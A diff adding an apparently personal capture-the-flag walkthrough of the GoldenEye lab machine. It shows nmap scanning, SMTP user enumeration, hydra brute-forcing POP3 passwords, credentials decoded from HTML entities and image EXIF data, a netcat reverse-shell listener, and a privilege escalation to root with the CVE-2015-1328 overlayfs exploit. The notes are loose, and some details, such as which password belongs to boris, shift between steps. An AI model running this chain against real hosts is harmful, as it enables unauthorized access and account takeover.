@@ -1,0 +1,310 @@
+IP: 10.10.230.220
+
+Nmap scan results:
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# nmap -A -T4 10.10.230.220
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 10:39 IST
+Nmap scan report for 10.10.230.220
+Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/10%OT=25%CT=1%CU=41459%PV=Y%DS=2%DC=T%G=Y%TM=5FAA20
+OS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
+OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
+OS:11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   139.27 ms 10.9.0.1
+2   139.42 ms 10.10.230.220
+
+
+//
+//Boris, make sure you update your default password.
+//My sources say MI6 maybe planning to infiltrate.
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+Boris's password is weak and his password is encoded below.
+
+Password for boris: InvincibleHack3r
+
+The encoding method used was HTML Entity method.
+
+After going to /sev-home/ it asks for username and password
+
+we can login as boris.
+
+and we get here
+
+
+
+GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)
+
+Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system
+
+Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# telnet 10.10.230.220
+Trying 10.10.230.220...
+telnet: Unable to connect to remote host: Connection refused
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# telnet 10.10.230.220 25
+Trying 10.10.230.220...
+Connected to 10.10.230.220.
+Escape character is '^]'.
+220 ubuntu GoldentEye SMTP Electronic-Mail agent
+VRFY boris
+252 2.0.0 boris
+
+Natalya
+Boris
+
+So the password for boris is secret1!
+
+LEts check the pop3 server.
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+So Xenia seems to be a newcomer,oh then they might send some credentials to her account.
+Lets try another brute force attack
+
+root@LAPTOP-U5913CMD:/home/akshay/Downloads# hydra -l natalya -P wordlist.txt  10.10.177.21  pop3 -s 55007 -t20
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 11:42:20
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task
+[DATA] attacking pop3://10.10.177.21:55007/
+[STATUS] 98.00 tries/min, 98 tries in 00:01h, 124 to do in 00:02h, 20 active
+[55007][pop3] host: 10.10.177.21   login: natalya   password: bird
+^Croot@LAPTOP-U5913CMD:/home/akshay/Downloads#
+
+
+retr 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+.
+
+
+
+[DATA] attacking pop3://10.10.177.21:110/
+root@LAPTOP-U5913CMD:/home/akshay/Downloads# hydra -l doak -P wordlist.txt 10.10.177.21 -t20 -I pop3 -s 55007
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 11:56:47
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task
+[DATA] attacking pop3://10.10.177.21:55007/
+[STATUS] 100.00 tries/min, 100 tries in 00:01h, 122 to do in 00:02h, 20 active
+[55007][pop3] host: 10.10.177.21   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 11:58:31
+root@LAPTOP-U5913CMD:/home/akshay/Downloads#
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Downloads# nc 10.10.177.21 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER doak
++OK
+PASS goat
++OK Logged in.
+LIST
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+.
+
+
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt.
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# wget http://severnaya-station.com/dir007key/for-007.jpg
+--2020-11-10 12:14:47--  http://severnaya-station.com/dir007key/for-007.jpg
+Resolving severnaya-station.com (severnaya-station.com)... 10.10.177.21
+Connecting to severnaya-station.com (severnaya-station.com)|10.10.177.21|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14896 (15K) [image/jpeg]
+Saving to: 'for-007.jpg'
+
+for-007.jpg                                    100%[====================================================================================================>]  14.55K  --.-KB/s    in 0.1s
+
+2020-11-10 12:14:47 (104 KB/s) - 'for-007.jpg' saved [14896/14896]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# exiftool for-007.jpg
+ExifTool Version Number         : 12.06
+File Name                       : for-007.jpg
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2018:04:25 06:10:02+05:30
+File Access Date/Time           : 2020:11:10 12:14:47+05:30
+File Inode Change Date/Time     : 2020:11:10 12:14:47+05:30
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+Make                            : GoldenEye
+Resolution Unit                 : inches
+Software                        : linux
+Artist                          : For James
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+User Comment                    : For 007
+Flashpix Version                : 0100
+Image Width                     : 313
+Image Height                    : 212
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 313x212
+Megapixels                      : 0.066
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# echo "eFdpbnRlcjE5OTV4IQ==
+" | base64 -d
+
+xWinter1995x!root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder#
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder#
+
+User:admin
+Passwod:xWinter1995x!
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/golder# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.203.82 56064
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+
+
+[+] [CVE-2015-1328] overlayfs
+
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Exposure: highly probable
+   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
+   Download URL: https://www.exploit-db.com/download/37292
+
+
+Edit the ofs.c file as gcc is not avaible and cc is available
+
+www-data@ubuntu:/tmp$ mv 37292 ofs.c
+
+www-data@ubuntu:/tmp$ gcc
+
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+www-data@ubuntu:/tmp$ cc ofs.c -o ofs
+ofs.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+ofs.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+ofs.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+ofs.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &status, 0);
+            ^
+ofs.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+www-data@ubuntu:/tmp$ ls
+ofs  ofs.c  tinyspellCVQl2r
+www-data@ubuntu:/tmp$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
